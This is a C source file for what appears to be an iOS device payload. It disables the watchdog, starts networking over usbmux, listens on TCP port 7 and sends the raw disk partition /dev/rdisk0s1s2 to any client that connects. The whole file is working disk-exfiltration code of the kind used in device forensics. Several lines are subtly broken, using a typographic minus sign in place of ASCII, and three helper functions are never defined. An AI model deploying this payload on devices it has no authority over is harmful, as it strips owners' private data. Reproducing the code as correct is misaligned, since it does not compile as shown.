#define MAC_OS_X_VERSION_MIN_REQUIRED MAC_OS_X_VERSION_10_5
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h> 
#include <sys/stat.h> 
#include <sys/socket.h> 
#include <net/if.h> 
#include <netinet/tcp.h>
#include <netinet/in.h>


void disable_watchdog ( );
void init_tcp ( ); 
void init_usb ( );


int send_file(int wfd, const char *filename)
{
   size_t nr, nw, br, bsize;
   static unsigned char *buf = NULL; struct stat sbuf;
   unsigned long long tb = 0;
   off_t off;
   int fd;
   printf("sending %s...\n", filename);
   fd = open(filename, O_RDONLY); 
   if (fd < 0) 
   {
      printf("ERROR: unable to open %s for reading: %s\n",
             filename, strerror(errno)); goto FAIL;
   }
   if (fstat(fd, &sbuf)) 
   {
      printf("ERROR: unable to fstat() file\n");
      goto FAIL;
   }
   bsize = sbuf.st_blksize;
   if ((buf = malloc(bsize)) == NULL) 
   {
      printf("ERROR: malloc() failed\n"); goto FAIL;
   }
   
   
   while ((nr = read(fd, buf, bsize)) > 0) 
   {
      if (nr) 
      {
         for (off = 0; nr; nr -= nw, off += nw) 
         {
            if ((nw = send(wfd, buf + off, (size_t)nr, 0)) < 0)
            {
               printf("ERROR: send() to socket failed"); goto FAIL;
            } 
            else 
            {
               tb += nw; 
            }
         } }
   }
   printf("transmitted %llu bytes\n", tb);
   free(buf); close(fd); return 0;
FAIL: sleep(10);
   free(buf);
   if (fd >= 0) close(fd); return −1;
}


int send_data(int wfd) 
{
   int r;
   printf("sending raw disk /dev/rdisk0s1s2...\n");
   r = send_file(wfd, "/dev/rdisk0s1s2"); if (r) return r;
   printf("transfer complete.\n");
   return 0; 
}


int socket_listen(void) 
{
   struct sockaddr_in local_addr, remote_addr;
   fd_set master, read_fds;
   int listener, fdmax, yes = 1, i; struct timeval tv;
   int port = 7;
   int do_listen = 1;
   int ret;
   FD_ZERO(&master); FD_ZERO(&read_fds);
   listener = socket(AF_INET, SOCK_STREAM, 0);
   setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
   memset(&local_addr, 0, sizeof(struct sockaddr_in)); local_addr.sin_family = AF_INET;
   local_addr.sin_port = htons(port); local_addr.sin_addr.s_addr = INADDR_ANY;
   i = bind(listener, (struct sockaddr *)&local_addr, sizeof(struct sockaddr));
   if (i) 
   {
      printf("ERROR: bind() returned %d: %s\n", i, strerror(errno));
      return i; 
   }
   i = listen(listener, 8);
   if (i) 
   {
      printf("ERROR: listen() returned %d: %s\n", i, strerror(errno));
      return i; 
   }
   
   FD_SET(listener, &master); fdmax = listener;
   printf("daemon now listening on TCP:%d.\n", port);
   while(do_listen) 
   { 
      read_fds = master; tv.tv_sec = 2; tv.tv_usec = 0;
      if (select(fdmax+1, &read_fds, NULL, NULL, &tv)>0) 
      {
         for(i=0; i<=fdmax; i++)
         {
            if (FD_ISSET(i, &read_fds)) { if (i == listener)
            {
               int newfd;
               int addrlen = sizeof(remote_addr);
               if ((newfd = accept(listener, (struct sockaddr *)&remote_addr, (socklen_t *)&addrlen)) == −1)
               {
                  continue;
               }
               setsockopt(newfd, SOL_SOCKET, TCP_NODELAY, &yes, sizeof(int));
               setsockopt(newfd, SOL_SOCKET, SO_NOSIGPIPE, &yes,
                          sizeof(int));
               ret = send_data(newfd); close(newfd);
               if (!ret)
                  do_listen = 0;
            }
            } /* if FD_ISSET ... */
         } /* for(i=0; i<=fdmax; i++) */ 
      } /* if (select(fdmax+1, ... */
   } /* for(;;) */
   printf("rebooting device in 10 seconds.\n"); sleep(10);
   return 0;
}




int main(int argc, char* argv[])
{
   printf("payload compiled " __DATE__ " " __TIME__ "\n");
   disable_watchdog(); printf("watchdog disabled.\n");
   init_tcp();
   init_usb();
   printf("usbmux initialized\n");
   return socket_listen();
}
